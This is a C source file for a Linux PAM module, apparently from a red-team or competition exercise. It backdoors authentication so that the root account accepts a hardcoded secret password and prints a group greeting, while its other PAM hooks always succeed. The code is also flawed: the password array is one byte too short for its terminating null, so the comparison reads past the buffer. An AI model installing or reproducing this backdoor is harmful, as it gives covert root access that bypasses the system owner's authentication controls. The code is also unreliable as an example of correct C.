#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <security/pam_appl.h>
#include <security/pam_modules.h>

// Set credentials PAM.
PAM_EXTERN int pam_sm_setcred( pam_handle_t *pamh, int flags, int argc, const char **argv ) {
	return PAM_SUCCESS;
}

// Account management PAM.
PAM_EXTERN int pam_sm_acct_mgmt(pam_handle_t *pamh, int flags, int argc, const char **argv) {
	return PAM_SUCCESS;
}

// PAM authenticate.
PAM_EXTERN int pam_sm_authenticate( pam_handle_t *pam_handler, int flags,int argc, const char **argv ) {
	const char *username = NULL;
	const char *password = NULL;
	int pam_code;

	char intended_passwd[21] = "Pineapple.Zebra.Float";

	pam_code = pam_get_user(pam_handler, &username, "Username: ");
	if (pam_code != PAM_SUCCESS) {
		return PAM_IGNORE;
	}

	// Only provide auth for root user.
	if (strcmp(username, "root") != 0) {
		return PAM_IGNORE;
	}

	// Get the password from PAM.
	pam_code = pam_get_authtok(pam_handler, PAM_AUTHTOK, &password, "Password: ");
	if (pam_code != PAM_SUCCESS) {
		return PAM_IGNORE;
	}

	// Ensure password is correct.
	if (strcmp(password,intended_passwd) == 0) {
		printf("Welcome back Group 112!");
		return PAM_SUCCESS;
	}

	return PAM_IGNORE;
}
